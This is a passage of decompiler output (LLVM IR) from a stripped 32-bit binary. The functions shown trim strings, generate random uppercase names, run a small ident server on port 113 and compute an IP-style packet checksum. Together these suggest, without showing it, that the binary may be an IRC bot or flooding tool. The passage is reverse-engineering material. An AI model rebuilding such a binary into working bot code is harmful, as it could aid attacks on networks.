dec_label_pc_8048411:                             ; preds = %dec_label_pc_8048407
  %v2_8048419 = call i32 @function_804d489(i32 %v1_80483f4)
  br label %dec_label_pc_8048450

dec_label_pc_8048423:                             ; preds = %dec_label_pc_8048407
  %v1_8048423 = call i32 @function_804e754(i32 %tmp3)
  %v0_804842a = load i64, i64* @global_var_8055e0c.12, align 8
  %sext = mul i64 %v0_804842a, 4294967296
  %v5_804842f = sdiv i64 %sext, 4294967296
  %v6_8048439 = zext i32 %v1_8048423 to i64
  %v14_8048439 = urem i64 %v6_8048439, %v5_804842f
  %v15_8048439 = trunc i64 %v14_8048439 to i32
  %v0_804843c = load i8*, i8** @global_var_8055e08.11, align 4
  %v1_804843c = ptrtoint i8* %v0_804843c to i32
  %v2_8048441 = add i32 %v15_8048439, 1
  %v1_8048444 = add i32 %v2_8048441, %v1_804843c
  %v2_8048448 = call i32 @function_804d489(i32 %v1_8048444)
  br label %dec_label_pc_8048450

dec_label_pc_8048450:                             ; preds = %dec_label_pc_8048411, %dec_label_pc_80483fd, %dec_label_pc_8048423
  %stack_var_-8.0 = phi i32 [ %v2_8048448, %dec_label_pc_8048423 ], [ %v2_8048419, %dec_label_pc_8048411 ], [ %v1_80483fd, %dec_label_pc_80483fd ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @function_804d489, { 1, 0 }
  uselistorder label %dec_label_pc_8048450, { 2, 0, 1 }
}

define i32 @function_8048455(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048455:
  %v4_804847d = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847d

dec_label_pc_804845e:                             ; preds = %dec_label_pc_80484a0, %dec_label_pc_804847d
  %v3_804846f = call i32 @_strlen(i8* %arg1)
  %v6_8048476 = add i32 %v4_804847d, %v3_804846f
  %v1_8048479 = add i32 %v6_8048476, -1
  %v1_804847a = inttoptr i32 %v1_8048479 to i8*
  store i8 0, i8* %v1_804847a, align 1
  br label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804845e
  %v3_804848e = call i32 @_strlen(i8* %arg1)
  %v6_8048495 = add i32 %v4_804847d, %v3_804848e
  %v1_8048498 = add i32 %v6_8048495, -1
  %v1_8048499 = inttoptr i32 %v1_8048498 to i8*
  %v2_8048499 = load i8, i8* %v1_8048499, align 1
  %v10_804849c = icmp eq i8 %v2_8048499, 13
  br i1 %v10_804849c, label %dec_label_pc_804845e, label %dec_label_pc_80484a0

dec_label_pc_80484a0:                             ; preds = %dec_label_pc_804847d
  %v3_80484b1 = call i32 @_strlen(i8* %arg1)
  %v6_80484b8 = add i32 %v4_804847d, %v3_80484b1
  %v1_80484bb = add i32 %v6_80484b8, -1
  %v1_80484bc = inttoptr i32 %v1_80484bb to i8*
  %v2_80484bc = load i8, i8* %v1_80484bc, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bc, 10
  br i1 %v11_80484bf, label %dec_label_pc_804845e, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a0
  %v1_80484c8 = sext i8 %v2_80484bc to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i8 %v2_80484bc, { 1, 0 }
  uselistorder i32 %v4_804847d, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847d, { 1, 0 }
}

define i32 @function_80484c9() local_unnamed_addr {
dec_label_pc_80484c9:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  %v1_80484d5 = call i32 @function_804e754(i32 %v0_80484ce)
  %v2_80484f7 = sdiv i32 %v1_80484d5, 5
  store i32 %v2_80484f7, i32* @ebx, align 4
  %tmp28 = mul i32 %v2_80484f7, -5
  %v2_8048510 = add i32 %tmp28, %v1_80484d5
  store i32 %v2_8048510, i32* @esi, align 4
  %v1_804851e = add i32 %v2_8048510, 4
  %v1_8048527 = add i32 %v2_8048510, 5
  %v2_804852b = call i32 @function_804daaa(i32 %v1_8048527)
  %tmp29 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_804852b, i32* %tmp29, align 4
  %tmp30 = inttoptr i32 %v2_804852b to i8*
  store i32 %v2_804852b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048541 = and i32 %v2_804852b, -256
  store i32 %v1_8048541, i32* @eax, align 4
  %v5_8048543 = call i8* @_memset(i8* %tmp30, i32 %v1_8048541, i32 %v1_8048527)
  %v3_8048554 = call i32 @function_804b90c(i32 ptrtoint ([16 x i8]* @global_var_8052250.14 to i32), i32 ptrtoint (i32* @global_var_805224e.13 to i32))
  store i32 %v3_8048554, i32* @eax, align 4
  %v4_804855c = icmp eq i32 %v3_8048554, 0
  %v1_8048560 = icmp eq i1 %v4_804855c, false
  br i1 %v1_8048560, label %dec_label_pc_80485dc, label %dec_label_pc_80485cf.preheader

dec_label_pc_80485cf.preheader:                   ; preds = %dec_label_pc_80484c9
  %v5_80485d546 = icmp sgt i32 %v1_804851e, 0
  br i1 %v5_80485d546, label %dec_label_pc_804856b, label %dec_label_pc_80486cf

dec_label_pc_804856b:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader
  %v4_8048570 = phi i8* [ %tmp30, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %storemerge47 = phi i32 [ 0, %dec_label_pc_80485cf.preheader ], [ %v4_80485cc, %dec_label_pc_804856b ]
  store i32 %storemerge47, i32* @eax, align 4
  %v5_8048570 = ptrtoint i8* %v4_8048570 to i32
  %v6_8048570 = add i32 %v5_8048570, %storemerge47
  store i32 %v6_8048570, i32* @ebx, align 4
  %v1_8048573 = call i32 @function_804e754(i32 %storemerge47)
  %v2_8048596 = srem i32 %v1_8048573, 26
  %v14_80485b9 = trunc i32 %v2_8048596 to i8
  %v2_80485c8 = add i8 %v14_80485b9, 65
  %v2_80485ca = load i32, i32* @ebx, align 4
  %v3_80485ca = inttoptr i32 %v2_80485ca to i8*
  store i8 %v2_80485c8, i8* %v3_80485ca, align 1
  %v4_80485cc = add nuw nsw i32 %storemerge47, 1
  %exitcond = icmp eq i32 %v4_80485cc, %v1_804851e
  %v3_80486cf.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond, label %dec_label_pc_80486cf, label %dec_label_pc_804856b

dec_label_pc_80485dc:                             ; preds = %dec_label_pc_80484c9
  %v1_80485dc = call i32 @function_804e754(i32 %v3_8048554)
  store i32 %v1_80485dc, i32* @eax, align 4
  store i32 %v1_80485dc, i32* @ebx, align 4
  %v1_80485e3 = call i32 @function_804e754(i32 %tmp14)
  %v0_80485e8 = load i32, i32* @ebx, align 4
  %v5_80485ea = mul i32 %v0_80485e8, %v1_80485e3
  store i32 %v5_80485ea, i32* @ecx, align 4
  %v2_804860e = sdiv i32 %v5_80485ea, 12039
  store i32 %v2_804860e, i32* @ebx, align 4
  %tmp50 = mul i32 %v2_804860e, -45402
  %v2_8048622 = add i32 %v5_80485ea, %tmp50
  store i32 %v2_8048622, i32* @esi, align 4
  %v1_8048630 = add i32 %v2_8048622, 1
  %v2_8048665 = ptrtoint i32* %stack_var_-1060 to i32
  %tmp32 = bitcast i32* %stack_var_-1060 to i8*
  %v5_804866034 = sub i32 -1, %v2_8048622
  %v13_804866036 = and i32 %v5_804866034, %v1_8048630
  %v14_804866037 = icmp slt i32 %v13_804866036, 0
  %v16_804866039 = icmp slt i32 %v5_804866034, 0
  %v2_804866340 = icmp eq i1 %v16_804866039, %v14_804866037
  br i1 %v2_804866340, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_804863d:                             ; preds = %dec_label_pc_80485dc, %dec_label_pc_804863d
  %storemerge841 = phi i32 [ %v4_804865a, %dec_label_pc_804863d ], [ 0, %dec_label_pc_80485dc ]
  %v4_8048655 = call i32 @function_804cca8(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v4_804865a = add i32 %storemerge841, 1
  %v5_8048660 = sub i32 %v4_804865a, %v1_8048630
  %v11_8048660 = xor i32 %v4_804865a, %v1_8048630
  %v12_8048660 = xor i32 %v5_8048660, %v4_804865a
  %v13_8048660 = and i32 %v12_8048660, %v11_8048660
  %v14_8048660 = icmp slt i32 %v13_8048660, 0
  %v16_8048660 = icmp slt i32 %v5_8048660, 0
  %v2_8048663 = icmp eq i1 %v16_8048660, %v14_8048660
  br i1 %v2_8048663, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_8048665:                             ; preds = %dec_label_pc_804863d, %dec_label_pc_80485dc
  store i32 %v2_8048665, i32* @edx, align 4
  %v5_8048681 = call i32 @function_804d1d0(i8* %tmp32, i32 0, i32 1024)
  %v4_804869e = call i32 @function_804cca8(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v3_80486ac = call i32 @function_8048455(i8* %tmp32)
  store i32 %v2_804852b, i32* @edi, align 4
  store i32 %v2_8048665, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_80486c2 = call i8* @_memcpy(i8* %tmp30, i8* %tmp32, i32 %v1_804851e)
  %v8_80486c2 = ptrtoint i8* %v7_80486c2 to i32
  store i32 %v8_80486c2, i32* @ecx, align 4
  store i32 %v3_8048554, i32* @eax, align 4
  %tmp33 = inttoptr i32 %v3_8048554 to i16*
  %v3_80486ca = call i32 @function_804b7fc(i16* %tmp33)
  br label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader, %dec_label_pc_8048665
  %v3_80486cf = phi i8* [ %tmp30, %dec_label_pc_8048665 ], [ %tmp30, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %v4_80486cf = ptrtoint i8* %v3_80486cf to i32
  ret i32 %v4_80486cf

; uselistorder directives
  uselistorder i32 %v5_8048660, { 1, 0 }
  uselistorder i32 %v4_804865a, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804866034, { 1, 0 }
  uselistorder i8* %tmp32, { 2, 1, 0 }
  uselistorder i32 %v1_8048630, { 1, 2, 0 }
  uselistorder i32 %v2_8048622, { 2, 1, 0 }
  uselistorder i32 %v2_804860e, { 1, 0 }
  uselistorder i32 %v5_80485ea, { 1, 0, 2 }
  uselistorder i32 %v4_80485cc, { 1, 0 }
  uselistorder i32 %storemerge47, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8048554, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i8* %tmp30, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_804851e, { 2, 0, 1 }
  uselistorder i32 %v2_8048510, { 2, 1, 0 }
  uselistorder i32 %v2_80484f7, { 1, 0 }
  uselistorder i32 %v1_80484d5, { 1, 0 }
  uselistorder label %dec_label_pc_80486cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804863d, { 1, 0 }
}

define i32 @function_80486dd() local_unnamed_addr {
dec_label_pc_80486dd:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v4_80486fe = call i32 @function_804da58(i32 2, i32 1, i32 0)
  %v13_8048706 = icmp eq i32 %v4_80486fe, -1
  br i1 %v13_8048706, label %dec_label_pc_804895c, label %dec_label_pc_8048710

dec_label_pc_8048710:                             ; preds = %dec_label_pc_80486dd
  store i32 2, i32* %stack_var_-52, align 4
  %v2_804871d = call i32 @function_804d468(i16 113)
  %v2_8048730 = ptrtoint i32* %stack_var_-52 to i32
  %v4_8048758 = call i32 @function_804d928(i32 %v4_80486fe, i32 %v2_8048730, i32 16)
  %v10_804875d = icmp eq i32 %v4_8048758, -1
  br i1 %v10_804875d, label %dec_label_pc_804895c, label %dec_label_pc_8048766

dec_label_pc_8048766:                             ; preds = %dec_label_pc_8048710
  %v3_8048774 = call i32 @function_804d980(i32 %v4_80486fe, i32 1)
  %v10_8048779 = icmp eq i32 %v3_8048774, -1
  br i1 %v10_8048779, label %dec_label_pc_804895c, label %dec_label_pc_8048782

dec_label_pc_8048782:                             ; preds = %dec_label_pc_8048766
  %v0_8048782 = call i32 @function_804b624()
  %v1_8048787 = icmp eq i32 %v0_8048782, 0
  br i1 %v1_8048787, label %dec_label_pc_804895c, label %dec_label_pc_804878f

dec_label_pc_804878f:                             ; preds = %dec_label_pc_8048782
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048796 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8048799 = ptrtoint i32* %stack_var_-68 to i32
  %v4_80487aa = call i32 @function_804d8fc(i32 %v4_80486fe, i32 %v2_8048799, i32 %v2_8048796)
  store i32 %v4_80487aa, i32* @eax, align 4
  %v4_80487b2 = add i32 %v4_80487aa, 1
  %v13_80487b2 = icmp eq i32 %v4_80487b2, 0
  %v1_80487b6 = icmp eq i1 %v13_80487b2, false
  br i1 %v1_80487b6, label %dec_label_pc_80487c4.preheader, label %dec_label_pc_80487b8

dec_label_pc_80487b8:                             ; preds = %dec_label_pc_804878f
  %v1_80487bf = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_80487c4.preheader

dec_label_pc_80487c4.preheader:                   ; preds = %dec_label_pc_80487b8, %dec_label_pc_804878f
  %v2_80487ce = ptrtoint i32* %stack_var_-1228 to i32
  %tmp27 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80487e2 = udiv i32 %v4_80487aa, 32
  %v1_80487e8 = urem i32 %v4_80487aa, 32
  %v9_80487eb = shl i32 1, %v1_80487e8
  %v2_804880d = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048857 = mul nuw nsw i32 %v2_80487e2, 4
  %v3_8048857 = add nsw i32 %v2_8048857, -1224
  br label %dec_label_pc_80487c4

dec_label_pc_80487c4:                             ; preds = %dec_label_pc_80487c4.preheader, %dec_label_pc_8048849
  store i32 %v2_80487ce, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80487d5 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80487eb = load i32, i32* @ebp, align 4
  %v4_80487eb = add i32 %v3_8048857, %v0_80487eb
  %v5_80487eb = inttoptr i32 %v4_80487eb to i32*
  %v6_80487eb = load i32, i32* %v5_80487eb, align 4
  %v12_80487eb = or i32 %v6_80487eb, %v9_80487eb
  store i32 %v12_80487eb, i32* %v5_80487eb, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_8048834 = call i32 @function_804b710(i32 %v4_80487b2, i32 %v2_80487ce, i32 0, i32 0, i32 %v2_804880d)
  store i32 %v6_8048834, i32* @eax, align 4
  %v2_8048839 = icmp slt i32 %v6_8048834, 0
  %v1_804883b = icmp eq i1 %v2_8048839, false
  br i1 %v1_804883b, label %dec_label_pc_8048849, label %dec_label_pc_804883d

dec_label_pc_804883d:                             ; preds = %dec_label_pc_80487c4
  %v1_8048844 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048849

dec_label_pc_8048849:                             ; preds = %dec_label_pc_80487c4, %dec_label_pc_804883d
  %v0_8048857 = load i32, i32* @ebp, align 4
  %v4_8048857 = add i32 %v3_8048857, %v0_8048857
  %v5_8048857 = inttoptr i32 %v4_8048857 to i32*
  %v6_8048857 = load i32, i32* %v5_8048857, align 4
  %v10_8048857 = and i32 %v6_8048857, %v9_80487eb
  %v11_8048857 = icmp ne i32 %v10_8048857, 0
  %v4_8048862 = icmp eq i1 %v11_8048857, false
  %v1_8048864 = icmp eq i1 %v4_8048862, false
  br i1 %v1_8048864, label %dec_label_pc_804886b, label %dec_label_pc_80487c4

dec_label_pc_804886b:                             ; preds = %dec_label_pc_8048849
  %v2_804887b = ptrtoint i32* %stack_var_-1092 to i32
  %v5_804888b = call i32 @function_804d9a4(i32 %v4_80487aa, i32 %v2_804887b, i32 1024, i32 0)
  store i32 %v5_804888b, i32* @eax, align 4
  %tmp28 = icmp slt i32 %v5_804888b, 1
  br i1 %tmp28, label %dec_label_pc_804889f, label %dec_label_pc_8048899

dec_label_pc_8048899:                             ; preds = %dec_label_pc_804886b
  %v7_804889d = icmp sgt i32 %v5_804888b, 19
  br i1 %v7_804889d, label %dec_label_pc_804889f, label %dec_label_pc_80488ab

dec_label_pc_804889f:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804886b
  %v1_80488a6 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_80488ab

dec_label_pc_80488ab:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804889f
  %v0_80488ae = load i32, i32* @ebp, align 4
  %v2_80488ae = add i32 %v5_804888b, -1088
  %v3_80488ae = add i32 %v2_80488ae, %v0_80488ae
  %v4_80488ae = inttoptr i32 %v3_80488ae to i8*
  store i8 0, i8* %v4_80488ae, align 1
  %v0_80488ba = load i32, i32* @ebp, align 4
  %v2_80488ba = add i32 %v5_804888b, -1089
  %v3_80488ba = add i32 %v2_80488ba, %v0_80488ba
  %v4_80488ba = inttoptr i32 %v3_80488ba to i8*
  %v5_80488ba = load i8, i8* %v4_80488ba, align 1
  %v10_80488c2 = icmp eq i8 %v5_80488ba, 10
  br i1 %v10_80488c2, label %dec_label_pc_80488d6, label %dec_label_pc_80488c6

dec_label_pc_80488c6:                             ; preds = %dec_label_pc_80488ab
  %v5_80488ca = load i8, i8* %v4_80488ba, align 1
  %v10_80488d2 = icmp eq i8 %v5_80488ca, 13
  %v1_80488d4 = icmp eq i1 %v10_80488d2, false
  br i1 %v1_80488d4, label %dec_label_pc_80488e2, label %dec_label_pc_80488d6

dec_label_pc_80488d6:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488ab
  store i8 0, i8* %v4_80488ba, align 1
  %v0_80488e8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80488e2

dec_label_pc_80488e2:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488d6
  %v0_804890c = phi i32 [ %v0_80488ba, %dec_label_pc_80488c6 ], [ %v0_80488e8.pre, %dec_label_pc_80488d6 ]
  %v2_80488e8 = add i32 %v5_804888b, -1090
  %v3_80488e8 = add i32 %v2_80488e8, %v0_804890c
  %v4_80488e8 = inttoptr i32 %v3_80488e8 to i8*
  %v5_80488e8 = load i8, i8* %v4_80488e8, align 1
  %v10_80488f0 = icmp eq i8 %v5_80488e8, 10
  br i1 %v10_80488f0, label %dec_label_pc_8048906, label %dec_label_pc_80488f4

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_80488e2
  %v5_80488fa = load i8, i8* %v4_80488e8, align 1
  %v10_8048902 = icmp eq i8 %v5_80488fa, 13
  %v1_8048904 = icmp eq i1 %v10_8048902, false
  br i1 %v1_8048904, label %dec_label_pc_8048914, label %dec_label_pc_8048906

dec_label_pc_8048906:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_80488e2
  store i8 0, i8* %v4_80488e8, align 1
  br label %dec_label_pc_8048914

dec_label_pc_8048914:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_8048906
  %v3_8048935 = call i32 @function_80482b3(i32 %v4_80487aa, i32 ptrtoint ([25 x i8]* @global_var_8052260.16 to i32))
  %v1_8048940 = call i32 @function_804b5f4(i32 %v4_80487aa)
  %v1_804894b = call i32 @function_804b5f4(i32 %v4_80486fe)
  store i32 %v1_804894b, i32* @eax, align 4
  %v1_8048957 = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_804895c

dec_label_pc_804895c:                             ; preds = %dec_label_pc_8048782, %dec_label_pc_8048766, %dec_label_pc_8048710, %dec_label_pc_80486dd, %dec_label_pc_8048914
  %v0_8048964 = phi i32 [ 0, %dec_label_pc_8048782 ], [ %v3_8048774, %dec_label_pc_8048766 ], [ %v4_8048758, %dec_label_pc_8048710 ], [ %v4_80486fe, %dec_label_pc_80486dd ], [ %v1_8048957, %dec_label_pc_8048914 ]
  ret i32 %v0_8048964

; uselistorder directives
  uselistorder i32 %v5_804888b, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_8048857, { 1, 0 }
  uselistorder i32 %v4_80487aa, { 3, 2, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_8048774, { 1, 0 }
  uselistorder i32 %v4_8048758, { 1, 0 }
  uselistorder i32 %v4_80486fe, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ()* @function_804b624, { 1, 0 }
  uselistorder label %dec_label_pc_804895c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048914, { 1, 0 }
  uselistorder label %dec_label_pc_80488e2, { 1, 0 }
  uselistorder label %dec_label_pc_80488ab, { 1, 0 }
  uselistorder label %dec_label_pc_8048849, { 1, 0 }
  uselistorder label %dec_label_pc_80487c4, { 1, 0 }
}

define i32 @function_8048965(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048965:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048965 = load i32, i32* @ebp, align 4
  store i32 %v0_8048965, i32* %stack_var_-4, align 4
  %v4_8048965 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048965, i32* @ebp, align 4
  %v4_804896b = icmp eq i32 %arg2, 0
  %v1_804896f = icmp eq i1 %v4_804896b, false
  br i1 %v1_804896f, label %dec_label_pc_804897a, label %dec_label_pc_80489a4

dec_label_pc_804897a:                             ; preds = %dec_label_pc_8048965
  %v4_804897a = add i32 %arg2, -1
  %v12_804897a = icmp eq i32 %v4_804897a, 0
  %v1_804897e = icmp eq i1 %v12_804897a, false
  br i1 %v1_804897e, label %dec_label_pc_8048988, label %dec_label_pc_8048980

dec_label_pc_8048980:                             ; preds = %dec_label_pc_804897a
  %v4_8048980 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80489a4

dec_label_pc_8048988:                             ; preds = %dec_label_pc_804897a
  %v4_8048996 = call i32 @function_8048965(i64 %arg1, i32 %v4_804897a)
  %v6_804899d = sext i32 %v4_8048996 to i64
  %v8_804899d = mul nsw i64 %v6_804899d, %arg1
  %v9_804899d = trunc i64 %v8_804899d to i32
  br label %dec_label_pc_80489a4

dec_label_pc_80489a4:                             ; preds = %dec_label_pc_8048965, %dec_label_pc_8048980, %dec_label_pc_8048988
  %stack_var_-8.0.off0 = phi i32 [ %v9_804899d, %dec_label_pc_8048988 ], [ %v4_8048980, %dec_label_pc_8048980 ], [ 1, %dec_label_pc_8048965 ]
  ret i32 %stack_var_-8.0.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i64 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80489a4, { 2, 1, 0 }
}

define i32 @function_80489a9(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80489a9:
  %v0_80489a9 = load i32, i32* @ebp, align 4
  %v4_80489db17 = add i32 %arg2, -1
  %v9_80489db18 = sub i32 0, %arg2
  %v10_80489db19 = and i32 %arg2, %v9_80489db18
  %v11_80489db20 = icmp slt i32 %v10_80489db19, 0
  %v12_80489db21 = icmp eq i32 %v4_80489db17, 0
  %v13_80489db22 = icmp slt i32 %v4_80489db17, 0
  %v3_80489df23 = icmp eq i1 %v13_80489db22, %v11_80489db20
  %v4_80489df24 = icmp eq i1 %v12_80489db21, false
  %v5_80489df25 = and i1 %v4_80489df24, %v3_80489df23
  br i1 %v5_80489df25, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489ca:                             ; preds = %dec_label_pc_80489a9, %dec_label_pc_80489ca
  %stack_var_-24.028 = phi i16 [ %v6_80489d0, %dec_label_pc_80489ca ], [ 0, %dec_label_pc_80489a9 ]
  %stack_var_-28.027 = phi i16* [ %v23_80489d3, %dec_label_pc_80489ca ], [ %arg1, %dec_label_pc_80489a9 ]
  %v3_80489d726 = phi i32 [ %v4_80489d7, %dec_label_pc_80489ca ], [ %arg2, %dec_label_pc_80489a9 ]
  %v4_80489ca = ptrtoint i16* %stack_var_-28.027 to i32
  %v2_80489cd = load i16, i16* %stack_var_-28.027, align 2
  %v6_80489d0 = add i16 %v2_80489cd, %stack_var_-24.028
  %v5_80489d3 = add i32 %v4_80489ca, 2
  %v23_80489d3 = inttoptr i32 %v5_80489d3 to i16*
  %v4_80489d7 = add i32 %v3_80489d726, -2
  %v4_80489db = add i32 %v3_80489d726, -3
  %v9_80489db = sub i32 2, %v3_80489d726
  %v10_80489db = and i32 %v4_80489d7, %v9_80489db
  %v11_80489db = icmp slt i32 %v10_80489db, 0
  %v12_80489db = icmp eq i32 %v4_80489db, 0
  %v13_80489db = icmp slt i32 %v4_80489db, 0
  %v3_80489df = icmp eq i1 %v13_80489db, %v11_80489db
  %v4_80489df = icmp eq i1 %v12_80489db, false
  %v5_80489df = and i1 %v4_80489df, %v3_80489df
  br i1 %v5_80489df, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ca, %dec_label_pc_80489a9
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %dec_label_pc_80489a9 ], [ %v23_80489d3, %dec_label_pc_80489ca ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_80489a9 ], [ %v6_80489d0, %dec_label_pc_80489ca ]
  %v4_80489df.lcssa = phi i1 [ %v4_80489df24, %dec_label_pc_80489a9 ], [ %v4_80489df, %dec_label_pc_80489ca ]
  br i1 %v4_80489df.lcssa, label %dec_label_pc_80489f9, label %dec_label_pc_80489e7

dec_label_pc_80489e7:                             ; preds = %dec_label_pc_80489e1
  %v1_80489ed = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80489ed = load i8, i8* %v1_80489ed, align 1
  %v3_80489ed = zext i8 %v2_80489ed to i16
  %v6_80489f6 = add i16 %v3_80489ed, %stack_var_-24.0.lcssa
  br label %dec_label_pc_80489f9

dec_label_pc_80489f9:                             ; preds = %dec_label_pc_80489e1, %dec_label_pc_80489e7
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80489e1 ], [ %v6_80489f6, %dec_label_pc_80489e7 ]
  %v4_80489f9 = sext i16 %stack_var_-24.1 to i32
  %v2_80489fc = sdiv i32 %v4_80489f9, 65536
  %v2_8048a03 = add nsw i32 %v2_80489fc, %v4_80489f9
  %sext = mul i32 %v2_8048a03, 65536
  %v4_8048a08 = sdiv i32 %sext, 65536
  %v2_8048a0b = ashr i32 %sext, 31
  %v6_8048a0e = add nsw i32 %v2_8048a0b, %v4_8048a08
  %sext4 = mul i32 %v6_8048a0e, 65536
  %tmp = sdiv i32 %sext4, -65536
  %v1_8048a15 = add i32 %tmp, -1
  store i32 %v0_80489a9, i32* @ebp, align 4
  ret i32 %v1_8048a15

; uselistorder directives
  uselistorder i32 %v4_80489f9, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80489db, { 1, 0 }
  uselistorder i32 %v4_80489d7, { 1, 0 }
  uselistorder label %dec_label_pc_80489f9, { 1, 0 }
  uselistorder label %dec_label_pc_80489ca, { 1, 0 }
}

define i32 @function_8048a25(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048a25:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8048a29 = load i32, i32* @esi, align 4
  store i32 %v0_8048a29, i32* %stack_var_-12, align 4
  %v2_8048a2a = icmp ult i32* %stack_var_-12, inttoptr (i32 5232 to i32*)
  store i1 %v2_8048a2a, i1* %cf.global-to-local, align 1
  %v1_8048a36 = call i32 @function_8048311(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048a3b = icmp eq i32 %v1_8048a36, 0
  %v1_8048a3d = icmp eq i1 %v1_8048a3b, false
  br i1 %v1_8048a3d, label %dec_label_pc_8048f45, label %dec_label_pc_8048a43

dec_label_pc_8048a43:                             ; preds = %dec_label_pc_8048a25
  %v4_8048a43 = add i32 %arg3, -1
  %v8_8048a43 = icmp eq i32 %arg3, 0
  %v9_8048a43 = sub i32 0, %arg3
  %v10_8048a43 = and i32 %arg3, %v9_8048a43
  %v11_8048a43 = icmp slt i32 %v10_8048a43, 0
  store i1 %v8_8048a43, i1* %cf.global-to-local, align 1
  %v12_8048a43 = icmp eq i32 %v4_8048a43, 0
  %v13_8048a43 = icmp slt i32 %v4_8048a43, 0
  %v3_8048a47 = icmp eq i1 %v13_8048a43, %v11_8048a43
  %v4_8048a47 = icmp eq i1 %v12_8048a43, false
  %v5_8048a47 = and i1 %v4_8048a47, %v3_8048a47
  br i1 %v5_8048a47, label %dec_label_pc_8048a6f, label %dec_label_pc_8048a49

dec_label_pc_8048a49:                             ; preds = %dec_label_pc_8048a43
  %v3_8048a5e = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_805227c.17 to i32))
  store i32 %v3_8048a5e, i32* @eax, align 4
  %v1_8048a6a = call i32 @function_804ec2c(i32 0)
  br label %dec_label_pc_8048a6f

